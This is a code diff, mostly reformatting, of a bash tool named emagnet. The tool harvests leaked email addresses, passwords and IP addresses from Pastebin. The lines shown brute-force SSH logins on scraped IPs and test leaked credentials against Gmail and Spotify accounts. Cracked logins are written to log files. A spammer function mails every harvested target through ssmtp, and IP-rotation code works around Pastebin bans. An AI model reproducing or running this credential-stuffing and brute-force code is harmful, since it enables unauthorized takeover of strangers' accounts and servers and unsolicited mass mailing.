@@ -216,21 +216,21 @@ INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"
 emagnet_heavyload() {
 curl -sL -H "$USERAGENT" "$PASTEBIN" \
 |grep -q "is under heavy load right now"
- if [[ "$?" = "0" ]]; then
-  for (( ; ; )); do
-   wait_time=60
-   temp_cnt="${wait_time}"
-     while [[ "${temp_cnt}" -gt 0 ]]; do
-        printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt}
-        printf " seconds"
-        sleep 1
-        ((temp_cnt--))
-     done
-     echo
-	  bash "$basename$0" --emagnet
-   done
-    bash "$basename$0" --emagnet
- fi
+  if [[ "$?" = "0" ]]; then
+    for (( ; ; )); do
+     wait_time=60
+     temp_cnt="${wait_time}"
+       while [[ "${temp_cnt}" -gt 0 ]]; do
+       printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt}
+       printf " seconds"
+       sleep 1
+       ((temp_cnt--))
+    done
+   echo
+	 bash "$basename$0" --emagnet
+  done
+   bash "$basename$0" --emagnet
+fi
 }
 
 emagnet_I_was_banned() {
@@ -261,7 +261,7 @@ if [[ "$?" = "0" ]]; then
         			      exit 1
       else
                     emagnet_banned
-  fi
+      fi
 fi
 }
 
@@ -335,7 +335,6 @@ else
       sleep 10
       MYIP="$(curl -s https://nr1.nu/i/)"
       MYOLDIP="$(cat $HOME/.config/emagnet/tmp/.emagnet-ip)"
-
 	    if [[ "$MYIP" != "$MYOLDIP" ]]; then
                 rm "$HOME/.config/emagnet/tmp/.emagnet-ip" &> /dev/null
                 MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
@@ -364,7 +363,6 @@ else
 emagnet_analyzing_message() {
     text="Analyzing..."
     delay="0.1"
-
 if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
@@ -390,26 +388,25 @@ TOTM="$(cat $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|wc -l)"         # 
 TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # Total passwords
 TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
 emagnet_clear;emagnet_banner
-
           printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
 	        printf "%64s \n\n" | tr ' ' '='
 	        LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
-             for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
-                echo -e ",-> Merging logs from: $LOGDATE \n|"
-                logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
-                find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
-                touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
-                      while read logs; do 
-                         echo "$logs" >> "$EMAGNETARCHIVE/logs/$logfiles"; 
-                      	         if [[ "$?" -eq "0" ]]; then
-                                     printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
-             	                       sleep 1
-                                   else
-		                	               printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
-               	                     sleep 1
-                                 fi
-                      done < $HOME/emagnet/.emagnet-temp-merge.txt
-               sleep 0.2
+           for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
+            echo -e ",-> Merging logs from: $LOGDATE \n|"
+            logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
+            find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
+            touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
+              while read logs; do 
+                  echo "$logs" >> "$EMAGNETARCHIVE/logs/$logfiles"; 
+                if [[ "$?" -eq "0" ]]; then
+                  printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
+                  sleep 1
+                else
+		              printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
+                  sleep 1
+                fi
+                  done < $HOME/emagnet/.emagnet-temp-merge.txt
+                  sleep 0.2
             done
         printf "|\n"
         sleep 0.2
@@ -428,7 +425,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
 	  else
-            sleep 0
+           sleep 0
 fi
 
 wait_time=$TIME
@@ -459,7 +456,7 @@ fi
     		cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
         printf "%s\n\n" "Done.."
 
-   read -p "Wipe incoming directories (y/n): " cleanup
+      read -p "Wipe incoming directories (y/n): " cleanup
    if [[ "$cleanup" = "y" ]]; then
       rm -rf "$EMAGNET/incoming/"
       printf "\e[1;31mWiped\e[0m: $EMAGNET/incoming..\nDone..\n"
@@ -561,7 +558,7 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
  			    echo -e "[\e[1;31m<<\e[0m] - Wrong Password For $sshtargets: $SSHUSER:$SSHPASSWORD"
                             echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS " >> $EMAGNETLOGS/failed-2-crack.txt
 		fi
-	done < $SSHTARGETS
+	    done < $SSHTARGETS
 fi
 		    rm "$SSHPORTSCAN" "$SSHTARGETS" "./grep" "./open" &> /dev/null
     		sleep 4
@@ -573,8 +570,7 @@ VERSION="0.6.0"
 WWWSOURCE="https://nr1.nu/archive/sconsify"
 SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
 SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
-#-----
-
+     
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
@@ -600,15 +596,15 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
                    SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
                    FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
               fi
-     done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
-		if [[ $FAILED -gt "0" ]]; then
-             printf "%64s \n" | tr ' ' '='
-             echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
-             sleep 3
-             rm "$HOME/.config/emagnet/tmp/.emagnet-failed"
-             rm "$HOME/.config/emagnet/tmp/.emagnet-cracked"
-          else
-              sleep 0
+      done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
+		 
+    if [[ $FAILED -gt "0" ]]; then
+       printf "%64s \n" | tr ' ' '='
+       echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
+       sleep 3
+       rm "$HOME/.config/emagnet/tmp/.emagnet-{failed,cracked}"
+    else
+       sleep 0
     fi
 }
 
@@ -636,7 +632,7 @@ password="$(echo $line | cut -d: -f2)"
          echo -e "[+] Password: $password"                                              >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
          echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
       fi
-    done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
+done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
     	rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
     	sleep 3
 else
@@ -646,15 +642,12 @@ fi
 
 emagnet_spammer() {
 ssmtp &> /dev/null
-if [[ "$?" -gt "0" ]]; then
-    printf "%s\n" "$basename$0: internal error -- ssmtp is required to be installed"
-    exit 1
-fi
+if [[ "$?" -gt "0" ]]; then printf "%s\n" "$basename$0: internal error -- ssmtp is required to be installed";exit 1;fi
 
 if [[ -z "$EMAIL2SEND" ]]; then
     printf "%s\n" " - You must create a text file with the text you want to send"
     printf "%s\n" " - to all targets, when text file has been created then you must"
-    printf "%s\n\n" " - set ~/textfile file in $CONF under EMAIL2SEND"
+    printf "%s\n" " - set ~/textfile file in $CONF under EMAIL2SEND"
     exit 1
 fi
 
